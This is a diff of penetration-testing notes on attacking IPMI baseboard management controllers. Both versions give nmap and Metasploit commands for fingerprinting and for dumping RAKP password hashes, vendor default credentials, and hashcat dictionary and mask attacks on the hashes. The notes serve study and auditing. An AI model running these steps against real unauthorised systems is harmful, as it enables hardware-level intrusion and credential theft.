@@ -1,96 +1,94 @@
-# IPMI (Intelligent Platform Management Interface)
-
-**IPMI** is a hardware-based management system used for system monitoring and management, operating independently of the host's BIOS and OS. It functions through a **Baseboard Management Controller (BMC)**, typically an embedded ARM system on the motherboard.
-
-Accessing a BMC is nearly equivalent to **physical access**, allowing an attacker to monitor, reboot, power off, or reinstall the host operating system.
-
----
-
-### Phase 1: Service Footprinting
-
-Identify systems running IPMI to determine the version and supported authentication levels. IPMI communicates over **port 623 UDP**.
-
-|Tool|Module/Script|Purpose|
-|:--|:--|:--|
-|**Nmap**|`ipmi-version`|Fingerprints the IPMI version and authentication capabilities.|
-|**Metasploit**|`scanner/ipmi/ipmi_version`|Identifies IPMI version and supported authentication/hashing algorithms.|
-
-#### Operational Workflow
-
-1. **Identify the service** using Nmap:
-    
-    ```
-    sudo nmap -sU --script ipmi-version -p 623 <TARGET_IP>
-    ```
-    
-2. **Verify with Metasploit** to check for specific authentication requirements:
-    
-    ```
-    use auxiliary/scanner/ipmi/ipmi_version
-    set RHOSTS <TARGET_IP>
-    run
-    ```
-    
+1. Detect UDP port 623 to identify **Baseboard Management Controllers (BMCs)**.
+2. Identify IPMI version; if 2.0, the **RAKP protocol** is vulnerable to hash disclosure.
+3. Attempt default credentials based on hardware vendor (Dell, HP, Supermicro).
+4. If defaults fail, dump SHA1 or MD5 password hashes for valid users via **RAKP exploitation**.
+5. Crack captured hashes offline using Hashcat.
 
 ---
 
-### Phase 2: Default Credential Testing
+## IPMI Footprinting
 
-BMCs are frequently left with **default configurations**. These credentials may grant access to the web-based management console, SSH, or Telnet.
+Searching for management interfaces independent of the host operating system.
 
-|Product|Username|Password|
-|:--|:--|:--|
-|**Dell iDRAC**|`root`|`calvin`|
-|**HP iLO**|`Administrator`|Randomized 8-character string (numbers/uppercase)|
-|**Supermicro IPMI**|`ADMIN`|`ADMIN`|
+Use when port 623 UDP is detected or when auditing hardware-level access via **BMCs** like HP iLO, Dell DRAC, or Supermicro IPMI.
 
----
-
-### Phase 3: Exploiting the RAKP Flaw (IPMI 2.0)
-
-If default credentials fail, exploit a critical flaw in the **IPMI 2.0 RAKP protocol**. The server sends a **salted SHA1 or MD5 hash** of the user's password to the client _before_ authentication is completed.
-
-#### 1. Retrieve Password Hashes
-
-Use Metasploit to request hashes for valid user accounts. This technique works even if the account is secure because the flaw is inherent to the IPMI specification.
+Scan for IPMI version and authentication capabilities
 
 ```
-use auxiliary/scanner/ipmi/ipmi_dumphashes
-set RHOSTS <TARGET_IP>
+sudo nmap -sU --script ipmi-version -p 623 <TARGET_IP>
+```
+
+Identify version and supported cipher suites via Metasploit
+
+```
+use auxiliary/scanner/ipmi/ipmi_version
+set rhosts <TARGET_IP>
 run
 ```
 
-#### 2. Offline Password Cracking
+- Nmap → `sudo nmap -sU --script ipmi-version -p 623 <TARGET_IP>` → Prefer for initial discovery and vendor identification.
+- Metasploit → `use auxiliary/scanner/ipmi/ipmi_version` → Prefer for detailed authentication property enumeration.
 
-Once obtained, hashes are cracked offline using **Hashcat (Mode 7300)**.
+**UDP scanning requirements** must be met for port 623 to respond.
 
-- **Standard Dictionary Attack:**
-    
-    ```
-    hashcat -m 7300 <HASH_FILE> <WORDLIST>
-    ```
-    
-- **HP iLO Factory Default Mask Attack** (for 8-character uppercase/number strings):
-    
-    ```
-    hashcat -m 7300 <HASH_FILE> -a 3 ?1?1?1?1?1?1?1?1 -1 ?d?u
-    ```
-    
+## IPMI Authentication
 
----
+Accessing the web-based management console, Telnet, or SSH via hardware-specific accounts.
 
-### Attack Implications
+Attempt once a BMC vendor is identified through footprinting.
 
-- **Host Compromise:** Full control over the hardware allows for remote OS reinstallation or system disruption.
-- **Lateral Movement:** Cracked BMC passwords are often **reused** for SSH access to critical servers or other network management tools.
-- **Persistence:** Since IPMI is independent of the OS, changes to the operating system will not remove the attacker's access to the BMC.
+Manually test vendor-specific default credentials
 
----
+```
+# Dell iDRAC: root / calvin
+# HP iLO: Administrator / <RANDOM_8_CHAR_STRING>
+# Supermicro IPMI: ADMIN / ADMIN
+```
 
-### Dangerous & Misconfigured Settings
+- Unchanged factory default passwords on BMCs.
+- Password reuse across BMCs and critical server root accounts.
 
-|Setting/Issue|Risk|Impact|
-|:--|:--|:--|
-|**RAKP Protocol Flaw**|**Critical**: Inherent to the IPMI 2.0 specification.|Allows any network user to retrieve password hashes for valid accounts.|
-|**Default Credentials**|**High**: Common across Dell, HP, and Supermicro.|Immediate full access to the BMC console and host motherboard.|
-|**Lack of Segmentation**|**High**: Direct network access to BMCs from general segments.|Exposes hashes to anyone on the network, leading to potential RCE.|
+HP iLO defaults are not static; they use a randomized 8-character string of uppercase letters and numbers.
+
+**Default credentials** may be left unchanged even when the host OS is secured.
+
+## IPMI Hash Retrieval
+
+Exploiting the **RAKP protocol** flaw to force the server to send password hashes.
+
+Use when IPMI 2.0 is running and default credentials fail.
+
+Retrieve SHA1/MD5 hashes for all valid users in a specified list
+
+```
+use auxiliary/scanner/ipmi/ipmi_dumphashes
+set rhosts <TARGET_IP>
+set user_file <FILE_PATH>
+run
+```
+
+**RAKP protocol** sends salted hashes to the client before authentication is completed.
+
+**Protocol flaw** is inherent to the IPMI 2.0 specification and cannot be patched.
+
+## IPMI Hash Cracking
+
+Offline recovery of passwords from intercepted **RAKP** responses.
+
+Use after successfully dumping hashes from a BMC.
+
+Execute a dictionary attack against captured hashes
+
+```
+hashcat -m 7300 <FILE_PATH> <FILE_PATH>
+```
+
+Perform a mask attack against HP iLO default password patterns
+
+```
+hashcat -m 7300 <FILE_PATH> -a 3 ?1?1?1?1?1?1?1?1 -1 ?d?u
+```
+
+**Weak password policies** on BMC accounts allow for rapid offline recovery.
+
+> ⚠️ Gap: The source does not provide the specific syntax for the `ipmi_dumphashes` output file variable, though it lists `OUTPUT_HASHCAT_FILE` as an option in the module menu.
